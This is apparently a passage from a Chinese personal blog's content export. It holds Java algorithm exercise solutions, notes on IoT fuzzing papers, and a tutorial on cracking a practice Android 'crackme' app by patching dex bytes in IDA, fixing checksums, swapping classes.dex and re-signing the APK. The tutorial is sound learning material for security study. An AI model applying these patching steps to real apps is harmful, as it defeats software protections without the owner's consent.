<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">Find</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span> [][] array)</span> &#123;</span><br><span class="line">        <span class="comment">//是要从右上角来进行二分</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> array.length;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> array[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> n-<span class="number">1</span>,row=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(row&lt;m &amp;&amp; col&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target == array[row][col])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(target&gt;array[row][col])&#123;</span><br><span class="line">                <span class="comment">//说明第row行的所有元素都不行</span></span><br><span class="line">                row++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//说明第col列都不合适，都大于target</span></span><br><span class="line">                col--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无目标的二分法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minNumberInRotateArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">        <span class="comment">//二分法的变形，如果二分法没有目标值，则需要和端点进行比较，</span></span><br><span class="line">        <span class="comment">//这里比较的是右端点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>,right = array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[left]&lt;array[right])&#123;</span><br><span class="line">                <span class="keyword">return</span> array[left];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(array[mid]&gt;array[right] )&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[mid]&lt;array[right])&#123;</span><br><span class="line">                <span class="comment">//注意这里不能-1，因为只是mid+1后面的数据不满足需求了</span></span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minNumberInRotateArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">        <span class="comment">//二分法的变形，如果二分法没有目标值，则需要和端点进行比较，</span></span><br><span class="line">        <span class="comment">//这里比较的是左端点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>,right = array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[left]&lt;array[right])&#123;</span><br><span class="line">                <span class="keyword">return</span> array[left];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(array[mid]&gt;array[left] )&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array[mid]&lt;array[left])&#123;</span><br><span class="line">                <span class="comment">//注意这里不能-1，因为只是mid+1后面的数据不满足需求了</span></span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p><strong>JZ38</strong> <strong>字符串的排列</strong> 还需要再看看</p>
<p>二进制加法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addBinary</span><span class="params">(String a, String b)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> a.length()-<span class="number">1</span>,j = b.length()-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">jing</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span>||j&gt;=<span class="number">0</span> ||jing!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">ii</span> <span class="operator">=</span> i&gt;=<span class="number">0</span>?a.charAt(i--)-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">jj</span> <span class="operator">=</span> j&gt;=<span class="number">0</span>?b.charAt(j--)-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            jing = ii+jj+jing;</span><br><span class="line">            result.insert(<span class="number">0</span>,jing%<span class="number">2</span>);</span><br><span class="line">            jing = jing/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>得到一个字符串的掩码（就是看各个位置上面是不是有1）</p>
<p>​        &#x2F;&#x2F;将1进行左移相应的位数，就可以得到相关的掩码</p>
<p>​        masks[i] |&#x3D; 1 &lt;&lt; words[i].charAt(j) - ‘a’;</p>
<h4 id="剑指-Offer-II-005-单词长度的最大乘积"><a href="#剑指-Offer-II-005-单词长度的最大乘积" class="headerlink" title="剑指 Offer II 005. 单词长度的最大乘积"></a><a href="https://leetcode-cn.com/problems/aseY1I/">剑指 Offer II 005. 单词长度的最大乘积</a></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(String[] words)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> words.length;</span><br><span class="line">        <span class="type">int</span>[] masks = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">        <span class="comment">//得到字符串数组中的每个元素的掩码</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; words[i].length(); j ++)</span><br><span class="line">                <span class="comment">//将1进行左移相应的位数，就可以得到相关的掩码</span></span><br><span class="line">                masks[i] |= <span class="number">1</span> &lt;&lt; words[i].charAt(j) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i ++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; n; j ++)</span><br><span class="line">                <span class="comment">//表示 i 和 j里没有重复的字符</span></span><br><span class="line">                <span class="keyword">if</span>((masks[i] &amp; masks[j]) == <span class="number">0</span>)</span><br><span class="line">                    ans = Math.max(words[i].length() * words[j].length(), ans);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>notes</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/03/28/%E5%B7%A5%E4%BD%9C%E5%B2%97%E4%BD%8D/</url>
    <content><![CDATA[<p>自己可以做的目前有意向的岗位：</p>
<p>渗透测试工程师、Android安全工程师、测试开发工程师。</p>
<p><img src="C:\Users\Yuhui\AppData\Roaming\Typora\typora-user-images\image-20220328191227360.png" alt="image-20220328191227360"></p>
<p><img src="C:\Users\Yuhui\AppData\Roaming\Typora\typora-user-images\image-20220328191249768.png" alt="image-20220328191249768"></p>
<p><img src="C:\Users\Yuhui\AppData\Roaming\Typora\typora-user-images\image-20220328191311381.png" alt="image-20220328191311381"></p>
<p><img src="C:\Users\Yuhui\AppData\Roaming\Typora\typora-user-images\image-20220328191336271.png" alt="image-20220328191336271"></p>
<p><img src="C:\Users\Yuhui\AppData\Roaming\Typora\typora-user-images\image-20220328191433981.png" alt="image-20220328191433981"></p>
<p><img src="C:\Users\Yuhui\AppData\Roaming\Typora\typora-user-images\image-20220328191451671.png" alt="image-20220328191451671"></p>
]]></content>
  </entry>
  <entry>
    <title>破解第一个Android程序</title>
    <url>/2022/04/16/%E7%A0%B4%E8%A7%A3%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="使用IDA进行破解分析"><a href="#使用IDA进行破解分析" class="headerlink" title="使用IDA进行破解分析"></a>使用IDA进行破解分析</h1><ul>
<li>查找分析点<ol>
<li>使用apktool反编译apk<ul>
<li><code>Apktool_2.6.1.jar d app-release.apk -o outputdir</code></li>
</ul>
</li>
<li>查看资源文件中的string.xml</li>
<li>寻找相关的字符串对应的id号 比如 “unsuccessed”</li>
</ol>
</li>
<li>使用7z直接解压缩目标APK</li>
<li>提取其中的dex文件</li>
<li>载入ida</li>
<li>使用关键字搜索 ALT T 来搜索上面找到的id号</li>
<li>简单分析程序，然后修改dex文件<ul>
<li>edit - patch program -&gt; change byte -&gt; apply patches to input file</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h1 id="使用dex2jar工具对dex文件进行修复"><a href="#使用dex2jar工具对dex文件进行修复" class="headerlink" title="使用dex2jar工具对dex文件进行修复"></a>使用dex2jar工具对dex文件进行修复</h1><p>主要是修复dex文件中的这两个字段：（checksum、signature）。也可以使用dexfixter工具</p>
<ul>
<li><code>d2j-dex-recompute-checksum.bat classes.dex -o</code></li>
</ul>
<p>替换apk里面的dex文件为修复之后的文件</p>
<ul>
<li>删除文件：<ul>
<li><code>.\aapt r D:\tools\android\apks\crackme02.apk classes.dex</code></li>
</ul>
</li>
<li>替换文件：<ul>
<li><code>.\aapt a D:\tools\android\apks\crackme02.apk d:\tools\android\apks\classes.dex</code></li>
</ul>
</li>
</ul>
<h1 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h1><blockquote>
<p>签名之前需要将之前的apk文件里面原来的签名文件删除 </p>
<p>即删除 META-INF文件夹</p>
</blockquote>
<ul>
<li><code>jarsigner -keystore d:\android\android.jks -signedjar crackme02signed.apk crackme02.apk android</code></li>
<li>其中Android.jks是由AS自动生成的签名文件，android是证书名称</li>
</ul>
]]></content>
      <categories>
        <category>Android security</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>破解程序</tag>
      </tags>
  </entry>
  <entry>
    <title>配置自己的个人博客 github + hexo</title>
    <url>/2022/03/18/%E9%85%8D%E7%BD%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%20github%20+%20hexo/</url>
    <content><![CDATA[<h1 id="配置自己的个人博客-github-hexo"><a href="#配置自己的个人博客-github-hexo" class="headerlink" title="配置自己的个人博客 github + hexo"></a>配置自己的个人博客 github + hexo</h1><p>基本教程：</p>
<p><a href="https://zhuanlan.zhihu.com/p/26625249">https://zhuanlan.zhihu.com/p/26625249</a></p>
<span id="more"></span>



]]></content>
      <categories>
        <category>Fuzzing</category>
        <category>notes</category>
      </categories>
      <tags>
        <tag>notes</tag>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试相关论文笔记</title>
    <url>/2021/07/25/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="1-IOTFUZZER-Discovering-Memory-Corruptions-in-IoT-Through-App-based-Fuzzing"><a href="#1-IOTFUZZER-Discovering-Memory-Corruptions-in-IoT-Through-App-based-Fuzzing" class="headerlink" title="1.IOTFUZZER: Discovering Memory Corruptions in IoT Through App-based Fuzzing"></a>1.IOTFUZZER: Discovering Memory Corruptions in IoT Through App-based Fuzzing</h1><h2 id="摘要："><a href="#摘要：" class="headerlink" title="摘要："></a>摘要：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Existing binary analysis based approaches only work on firmware, which is less accessible except for those equipped with special tools for extracting the code from the device.</span><br><span class="line">现有的二进制分析的方法只能在固件上面工作，但是除了配备特殊工具的设备外，固件的获取具有一定的难度。</span><br><span class="line"> IOTFUZZER：自动fuzzing框架，目的是查找物联网设备中的内存损坏漏洞（不需要获取其固件镜像）</span><br><span class="line"> </span><br><span class="line">The key idea ：most IoT devices are controlled through their official mobile apps, and such an app often contains rich information about the protocol it uses to communicate with its device. </span><br><span class="line">主要思想：大多数的物联网设备是由APP控制的，这些APP中有与其交互的各种协议</span><br><span class="line"></span><br><span class="line"> Therefore, by identifying and reusing program-specific logic (e.g., encryption) to mutate the test case (particularly message fields), we are able to effectively probe IoT targets without relying on any knowledge about its protocol specifications. </span><br><span class="line"> 通过识别和重用APP特定的逻辑来变异测试用例，我们就可以有效得探测物联网目标，而不依赖于任何关于其协议规范的知识</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="主要思想："><a href="#主要思想：" class="headerlink" title="主要思想："></a>主要思想：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A unique property of IOTFUZZER is that it runs a protocol-guided fuzz and utilizes the information carried by the IoT app without reverse-engineering the protocol or explicit recovering such knowledge from the app, as prior approaches [20], [10] do. </span><br><span class="line">协议引导并且利用APP携带的信息</span><br><span class="line"></span><br><span class="line">it performs a dynamic analysis to identify the content inside the app that forms the messages to be delivered to the target device, and automatically mutates such content during the runtime so as to use the app’s program logics to produce meaningful test cases for probing the target firmware.</span><br><span class="line">利用动态执行来识别程序内部传递到目标设备的内容，并且自动变异这些内容</span><br></pre></td></tr></table></figure>

<h2 id="主要贡献："><a href="#主要贡献：" class="headerlink" title="主要贡献："></a>主要贡献：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	•New framework. We present the first firmware-free fuzzing framework, IOTFUZZER, for security analysis of IoT devices. By utilizing the information carried by official mobile apps and their program logics, IOTFUZZER could automatically detect memory corruption vulnerabilities in IoT devices without direct access to the firmware.</span><br><span class="line">	• New techniques. We developed a set of new techniques to enable an automatic, blackbox IoT fuzzer, which includes protocol-guided fuzzing without protocol specifications, in-context cryptographic and networking function replay for message generation and delivery, and a lightweight mechanism to remotely monitor the target IoT device’s status.</span><br><span class="line">	• Implementation and findings. We implemented a full-featured prototype of IOTFUZZER and evaluated it</span><br><span class="line">over 17 real-world IoT devices. Our study discovered 15 security-critical memory vulnerabilities, with 8 of them never reported before.</span><br><span class="line">	新框架：利用官方APP携带的信息和逻辑，IOTFUZZER自动检测内存损坏漏洞，而不需要获取固件</span><br><span class="line">	新技术：自动黑盒物联网fuzz工具，协议指导，消息生成和传递上下文加密和网络功能重放以及远程监控，轻量级</span><br><span class="line">	评估	</span><br></pre></td></tr></table></figure>

<h2 id="所面临的挑战"><a href="#所面临的挑战" class="headerlink" title="所面临的挑战"></a>所面临的挑战</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Challenges. Therefore, in order to generate fuzzing messages without making assumptions on protocol formats, we need to solve the following challenges.</span><br><span class="line">	• Challenge 1: Mutating fields in networking messages. Therefore, we need to automatically recognize and fuzz the protocol fields for unknown protocols.</span><br><span class="line">	我们需要自动识别和协议的字段信息等。</span><br><span class="line">	• Challenge 2: Handling encrypted messages. Thus, we need a lightweight and flexible</span><br><span class="line">solution to reuse the message encryption functions in the app.</span><br><span class="line">	需要一个轻量级的解决方法来重用在APP里面的加密函数</span><br><span class="line">	• Challenge 3: Monitoring crashes. In order to identify the system crash and the corresponding probing message that triggers the crash, we need to design an effective mechanism to remotely and automatically monitor the device status.</span><br><span class="line">	为了检测崩溃，我们需要设计一个远程检测设备状态的机制</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	• Mutating protocol fields at data sources. Since protocol reverse engineering for unknown protocols is expensive, we can mutate the data which is used in the protocol message (note that most of these data</span><br><span class="line">will be strings) at their sources (e.g., at data definition sites or some data use sites such as when passed as arguments to functions). Then correspondingly, following the original program logic, these mutated strings will eventually become protocol fields.</span><br><span class="line">	在数据源处变异协议的各个字段</span><br><span class="line">	• Reusing cryptographic functions at runtime. Since we have modified the data sources at the very be-</span><br><span class="line">ginning, the normal program execution will help us complete the message encryption procedure and gen-</span><br><span class="line">erate ready-to-send messages. Therefore, we do not need to re-implement the complete encryption logic</span><br><span class="line">out-of-the-box.</span><br><span class="line">	在APP运行时重用APP里面的加密函数：就不用逆向出具体的加密函数了</span><br><span class="line">	• Detecting liveness with heartbeat mechanism. Though we cannot monitor the status of the running</span><br><span class="line">device locally, we can infer whether the program or the system is alive by sending a heartbeat message. The heartbeat message can be any messages that query the status of the device.</span><br><span class="line">	使用heartbeat机制来检测设备的状态：心跳机制是一种检测故障的机制</span><br><span class="line">	也就是向设备发送一个消息，如果设备正常，设备会怎么样，设备不正常又会怎么样。</span><br></pre></td></tr></table></figure>

<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210729161035679.png" alt="image-20210729161035679"></p>
<p>具体来说有四个步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) UI analysis: In the first step, the goal is to analyze the code of IoT app and discover all UI components that will lead to the sending of networking messages. With such information, we can trigger message sending events by driving the corresponding UI controls. The purpose of UI analysis is to facilitate data-flow analysis and fuzzing in the following steps.</span><br><span class="line">2) Data-flow analysis: In order to identify the program elements (e.g., string constant, input from system APIs, etc.) whose values are related to the content of the message to be sent to the IoT device, we track the data flows from a set of selected elements (Section III-B) to find those indeed affecting some message fields. Those program elements are then used to mutate the content of the fields for fuzzing the device. Note that unlike taint-based fuzzers [7], [28] looking for the inputs of a program that can reach a known vulnerable function (e.g., printf) inside the program, our approach utilizes the data-flow analysis to determine how to command the IoT app to generate meaningful test outputs for fuzzing its remote target. </span><br><span class="line">3) Runtime mutation: Once the protocol fields are recognized, according to the fuzzing policy we defined, IOTFUZZER mutates the original fields (e.g., original string) at their first use sites. Then, the IoT app will follow its normal execution logic to compute and build the message and send it to IoT device with the mutated data.</span><br><span class="line">4) Response monitoring: The final step is to monitor the running status of IoT device remotely and capture the triggered crash. For TCP-based communication, the connection between the IoT app and the IoT device will be interrupted, which is easy to detect. For UDP-based communication, we use a heartbeat mechanism to detect the crashes occurred at uncertain times.</span><br><span class="line"></span><br><span class="line">1）UI分析：分析应用程序的代码，确定最终可以导致消息传递的UI组件。</span><br><span class="line">2）数据流分析：确定如何命令APP生成有意义的输入，追踪一组选定元素的数据流，以找到确实影响某些消息字段的元素（如，字符串常量、系统API输入等）</span><br><span class="line">3）运行时变异：根据定义的模糊策略，IOTFUZZER会在其首次使用的地方对原始字段进行变异。然后APP将遵循其正常执行逻辑来计算和构建消息，并将其与变异数据一起发送到物联网设备</span><br><span class="line">3）检测响应：基于UDP的通信，我们使用心跳机制来检测目标设备的状态</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>UI分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造call path：</span><br><span class="line">	使用Androguard 构建APP的调用图，从目标网络通信api开始，构建了到UI事件处理程序（event handlers）的反向代码路径。隐式控制流转换及其他事件驱动的调用，使用EdgeMiner 获取。代码路径的接收器是一组最终发送网络信息的时间处理器</span><br><span class="line">	</span><br><span class="line">activity转换图构造：</span><br><span class="line">	为了在fuzzing中到达特定的activity并且触发网络发送事件</span><br><span class="line">	使用Monkeyrunner 根据事件的执行顺序，通过简单的策略与每个activity中的UI元素进行交互。我们就可以获得一些列的UI event和触发他们的顺序。我们也记录了activity之间的转换。我们根据call path 过滤掉不会触发消息发送的event.转移图的节点是具有触发消息发送API的事件的activity，边是创建或恢复activity的事件</span><br></pre></td></tr></table></figure>

<p>数据流分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	为了在执行阶段变异协议的字段，我们需要识别协议的字段，和使用协议字段作为参数的函数。</span><br><span class="line">	command message通常是由硬编码字符串，用户输入或者系统API构成，我们使用TaintDroid的修改版本动态污点分析来识别他们。</span><br><span class="line">	在第一个使用消息的位置上对消息进行变异，就不用设置消息的格式了，所以记录了将受污染数据作为参数的函数，以便找到这个位置</span><br><span class="line">	我们不会将污点传播到加密函数，首先我们执行加密函数标识，然后将其中一个污点接收器设置为这些加密函数的参数</span><br><span class="line">	</span><br><span class="line">	污点来源：APP中的所有字符串、消息中常用的系统API（如WifiInfo.getMacAddress(),Location.getLatitude(), Location.getLongitude()),以及来自UI的用户输入(例如，EditText.getText()）</span><br><span class="line">	</span><br><span class="line">	污点传播：修改传播规则，扩大更多的污点源。使用字典来存储污点标签，每当创建一个新的标签时，就将其添加到字典中，并追踪这个标签的依赖关系。</span><br><span class="line">	污点接收器：这个是我们识别网络API和加密功能中使用的数据。</span><br><span class="line">	</span><br><span class="line">识别加密函数：</span><br><span class="line">	由于加密算法通常包含算术和位操作。我们选择包含这两种运算的函数，然后记录消息发送事件的执行轨迹，并基于相对于网络函数的位置来细化我们的候选函数。</span><br></pre></td></tr></table></figure>

<p>运行 时变异：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	动态hook之前记录的函数，并在运行时变异协议字段参数以生成探测消息</span><br><span class="line">好处：</span><br><span class="line">	1.协议字段在编码或者加密之前就可以模糊化</span><br><span class="line">	2.不需要逆向工程就可以知道未知协议领域的fuzzing</span><br><span class="line">	</span><br><span class="line">	使用Xposed框架来hook之前我们得到的函数（需要上下文相关：只有在特定的上下文环境下才会被触发）。之后原始数据就可以被变异之后的值代替传递到hook函数</span><br><span class="line">	注意：如果一个协议字段被传递给几个hook函数，他可能会被模糊化几次，并且同一个函数可能会被hook来模糊化几个协议字段。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730110451403.png" alt="image-20210730110451403"></p>
<p>因为我们每次变异协议的时候，不能变异所有的字段（容易被设备拒绝），只能变异字段的一个子集</p>
<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730111053438.png" alt="image-20210730111053438"></p>
<h2 id="fuzzing-policy"><a href="#fuzzing-policy" class="headerlink" title="fuzzing policy"></a>fuzzing policy</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Changing the lengths of strings for stack-based or heap-based overflow and out-of-bound access. In our implementation, IOTFUZZER duplicates the original strings several times (from dozens to thousands) or appends a variable number of character &quot;A&quot; to the original string to construct malformed messages.</span><br><span class="line">更改基于堆栈或者基于堆溢出和越界访问的字符串的长度</span><br><span class="line">2) Changing the integer , double or float values for integer overflow and out-of-bound access. Therefore, we mutate the original values into boundary cases and very-large values. Also, to trigger the cases of miscounting of boundary conditions, we also generate the off-by-one values for potential off-by-one error.</span><br><span class="line">更改整数，双精度，或者浮点数的值来造成整数溢出和越界访问。</span><br><span class="line">3) Changing the types, or providing empty values for misinterpretation of the value and uninitialized variable vulnerability. For example, if a string value is replaced with an integer value, a null pointer dereference may be triggered (as the case of Section IV -E1).In the implementation of IOTFUZZER, we mutate the types of Object at the Java level of Android apps</span><br><span class="line">更改类型，或者提供空值为了错误解释值和未初始化变量漏洞</span><br></pre></td></tr></table></figure>

<p>Response Monitoring</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	1) Expected Response. In this case, the probing messages are handled properly by the IoT device, and</span><br><span class="line">no exception occurs. Such a situation is out of our interests.</span><br><span class="line">	预期的响应：没有任何错误发生</span><br><span class="line">	2) Unexpected Response. The probing messages go beyond the intended logic of the program (e.g., reaching the input parameter boundary), and trigger untreated errors.</span><br><span class="line">	超出预期的响应：超出逻辑，触发未处理的错误</span><br><span class="line">	3) No Response. When no response is answered for a certain probing message, it may either trigger a DoS vulnerability, or it is just an error handled locally without replying, or running in a dead loop.</span><br><span class="line">	无响应：可能是DOS漏洞、在设备端处理了错误、或者是一个的死循环</span><br><span class="line">	4) Disconnection. For connection-oriented communication protocol like TCP , the network connection will be interrupted when a system crash is triggered by the probing message.</span><br><span class="line">	断开连接：由于发送的探测消息导致了设备系统崩溃</span><br></pre></td></tr></table></figure>

<p>碰撞检测机制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP连接：</span><br><span class="line">	查看连接的状态推断设备系统是否崩溃</span><br><span class="line">UDP连接：</span><br><span class="line">	心跳机制，首先我们从APP中提取心跳信息，用以检测设备是否处于活动状态</span><br><span class="line">	在fuzzing过程中，每隔10个探测信息就插入一个心跳消息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">某些已确认的崩溃是由相同的种子产生的变异消息所触发的，所以作者还记录了每个种子和变异消息对的关系。</span><br></pre></td></tr></table></figure>

<h2 id="局限："><a href="#局限：" class="headerlink" title="局限："></a>局限：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本文主要的焦点是从移动应用的数据输入通道自动识别内存损坏漏洞，但是对于其他类型的漏洞无能为力。</span><br><span class="line">并不能给出产生内存损坏漏洞的根本原因和类型</span><br><span class="line">本文是没有考虑有云的情况的。可能云会发出警报。</span><br></pre></td></tr></table></figure>

<h1 id="2-DIANE-Identifying-Fuzzing-Triggers-in-Apps-to-Generate-Under-constrained-Inputs-for-IoT-Devices"><a href="#2-DIANE-Identifying-Fuzzing-Triggers-in-Apps-to-Generate-Under-constrained-Inputs-for-IoT-Devices" class="headerlink" title="2. DIANE: Identifying Fuzzing Triggers in Apps to Generate Under-constrained Inputs for IoT Devices"></a>2. DIANE: Identifying Fuzzing Triggers in Apps to Generate Under-constrained Inputs for IoT Devices</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However , due to the difficulties in extracting and emulating custom firmware, black-box fuzzing is often the only viable analysis option. Unfortunately, this solution mostly produces invalid inputs, which are quickly discarded by the targeted IoT device and do not penetrate its code. </span><br><span class="line">固件获取困难，但是传统的黑盒测试会产生很多无意义的输入</span><br><span class="line">Another proposed approach is to leverage the companion app (i.e., the mobile app typically used to control an IoT device) to generate well-structured fuzzing inputs. Unfortunately, the existing solutions produce fuzzing inputs that are constrained by app-side validation code, thus significantly limiting the range of discovered vulnerabilities.</span><br><span class="line">从官方的APP端进行fuzzing，APP端对输入的验证会限制fuzzing的效率。</span><br><span class="line"></span><br><span class="line">Our key observation is that there exist functions inside the companion app that can be used to generate optimal (i.e., valid yet under-constrained) fuzzing inputs. fuzzing triggers：are executed before any data-transforming functions (e.g., network serialization), but after the input validation 